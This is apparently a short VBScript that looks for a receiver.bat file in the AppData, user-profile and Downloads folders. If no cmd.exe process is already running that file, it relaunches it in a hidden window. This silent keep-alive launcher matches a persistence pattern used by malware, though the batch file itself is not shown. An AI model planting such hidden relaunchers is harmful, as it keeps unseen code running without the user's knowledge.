Set fso = CreateObject("Scripting.FileSystemObject")

batchFilePath1 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\receiver.bat"
batchFilePath2 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\receiver.bat"
batchFilePath3 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\receiver.bat"

' Function to check file existence and return the first valid path
Function GetValidBatchFilePath()
    If fso.FileExists(batchFilePath1) Then
        GetValidBatchFilePath = batchFilePath1
    ElseIf fso.FileExists(batchFilePath2) Then
        GetValidBatchFilePath = batchFilePath2
    ElseIf fso.FileExists(batchFilePath3) Then
        GetValidBatchFilePath = batchFilePath3
    Else
        GetValidBatchFilePath = "" ' No valid path found
    End If
End Function

validBatchPath = GetValidBatchFilePath()

If validBatchPath = "" Then
    WScript.Quit
End If

Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
Set ProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'cmd.exe'")

isRunning = False

For Each Process In ProcessList
    ' Check the command line of each cmd.exe process
    If InStr(LCase(Process.CommandLine), LCase(validBatchPath)) > 0 Then
        isRunning = True
        Exit For
    End If
Next

If Not isRunning Then
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run Chr(34) & validBatchPath & Chr(34), 0
    Set WshShell = Nothing
Else
End If
